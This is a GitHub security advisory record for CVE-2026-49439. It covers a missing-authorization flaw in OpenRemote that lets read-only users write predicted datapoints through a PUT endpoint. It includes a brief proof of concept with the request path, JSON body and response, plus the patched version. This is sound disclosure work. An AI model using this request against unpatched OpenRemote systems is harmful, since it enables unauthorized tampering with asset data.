{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/162506564?v=4", "events_url": "https://api.github.com/users/Hussien-Alzaghateet/events{/privacy}", "followers_url": "https://api.github.com/users/Hussien-Alzaghateet/followers", "following_url": "https://api.github.com/users/Hussien-Alzaghateet/following{/other_user}", "gists_url": "https://api.github.com/users/Hussien-Alzaghateet/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Hussien-Alzaghateet", "id": 162506564, "login": "Hussien-Alzaghateet", "node_id": "U_kgDOCa-nRA", "organizations_url": "https://api.github.com/users/Hussien-Alzaghateet/orgs", "received_events_url": "https://api.github.com/users/Hussien-Alzaghateet/received_events", "repos_url": "https://api.github.com/users/Hussien-Alzaghateet/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Hussien-Alzaghateet/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Hussien-Alzaghateet/subscriptions", "type": "User", "url": "https://api.github.com/users/Hussien-Alzaghateet", "user_view_type": "public"}}], "cve_id": "CVE-2026-49439", "cvss": {"score": 4.3, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}, "cvss_severities": {"cvss_v3": {"score": 4.3, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-862", "name": "Missing Authorization"}], "description": "# Summary

The predicted datapoint write endpoint allows users with only `read:assets` privileges to write predicted datapoints.

The endpoint:

```text
PUT /api/{realm}/asset/predicted/{assetId}/{attributeName}
```

accepts write requests from users lacking `write:assets`.

The implementation appears to check `READ_ASSETS` while performing a write operation through:

```java
assetPredictedDatapointService.updateValues(...)
```

# PoC

A user was created with only:

```text
read:assets
```

and without `write:assets`.

The following request succeeded:

```http
PUT /api/master/asset/predicted/4Fr8Pcp7iDjrEmoSUFolvT/temperature
```

Request body:

```json
[{"x":1779199999001,"y":1337}]
```

Response:

```text
HTTP/2 204
```

Database verification confirmed the datapoint was written successfully:

```text
entity_id: 4Fr8Pcp7iDjrEmoSUFolvT
attribute_name: temperature
value: 1337
```

# Impact

Users with read-only asset permissions can modify predicted datapoints for assets.", "ghsa_id": "GHSA-xj53-j257-hxvg", "github_reviewed_at": "2026-07-06T16:52:35Z", "html_url": "https://github.com/advisories/GHSA-xj53-j257-hxvg", "identifiers": [{"type": "GHSA", "value": "GHSA-xj53-j257-hxvg"}, {"type": "CVE", "value": "CVE-2026-49439"}], "nvd_published_at": null, "published_at": "2026-07-06T16:52:35Z", "references": ["https://github.com/openremote/openremote/security/advisories/GHSA-xj53-j257-hxvg", "https://github.com/openremote/openremote/commit/583dbbfb96076ba099be8729ddf506acf9e48325", "https://github.com/advisories/GHSA-xj53-j257-hxvg"], "repository_advisory_url": "https://api.github.com/repos/openremote/openremote/security-advisories/GHSA-xj53-j257-hxvg", "severity": "medium", "source_code_location": "https://github.com/openremote/openremote", "summary": "OpenRemote read-only asset users can write predicted datapoints", "type": "reviewed", "updated_at": "2026-07-06T16:52:35Z", "url": "https://api.github.com/advisories/GHSA-xj53-j257-hxvg", "vulnerabilities": [{"first_patched_version": "1.24.1", "package": {"ecosystem": "maven", "name": "io.openremote:openremote-manager"}, "vulnerable_functions": [], "vulnerable_version_range": "< 1.24.1"}], "withdrawn_at": null}

reasons: 資産不一致または判定情報不足

title: OpenRemote read-only asset users can write predicted datapoints
